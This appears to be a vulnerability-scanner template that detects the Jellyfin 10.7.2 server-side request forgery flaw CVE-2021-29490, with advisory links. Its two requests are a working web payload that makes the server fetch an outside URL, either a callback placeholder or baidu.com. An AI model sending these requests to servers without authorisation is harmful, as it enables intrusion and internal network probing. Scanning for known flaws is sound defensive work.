name: Jellyfin 10.7.2 SSRF CVE-2021-29490
manual: true
query: title="Jellyfin"
transport: http
rules:
  r0:
    request:
      method: GET
      path: /Images/Remote?imageUrl=http://{{check}}
    expression: response.status == 200
  r1:
    request:
      method: GET
      path: /Images/Remote?imageUrl=http://www.baidu.com
    expression: response.status == 200 && response.body.bcontains(b"百度")
expression: r0() || r1()
detail:
  links:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-29490
  - https://github.com/jellyfin/jellyfin/security/advisories/GHSA-rgjw-4fwc-9v96
  - https://mp.weixin.qq.com/s?__biz=MzkwNDI1NDUwMQ==&mid=2247485439&idx=3&sn=4bd6fc982541ca3ec610856c37a36c14
  description: Jellyfin is the volunteer-built media solution that puts you in control
    of your media. Stream to any device from your own server, with no strings attached.
  tags: ssrf
